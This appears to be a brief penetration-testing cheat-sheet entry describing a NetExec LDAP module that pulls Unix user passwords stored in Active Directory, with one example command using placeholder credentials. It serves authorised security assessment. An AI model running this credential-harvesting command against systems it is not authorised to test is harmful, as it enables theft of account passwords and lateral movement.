# Get Unix User Password

This command retrieves passwords for Unix-based systems if integrated with AD. It is useful for assessing whether Unix accounts are vulnerable to attacks such as Pass-the-Hash.

    nxc ldap IP -u USER -p Password@1 -M get-unixUserPassword
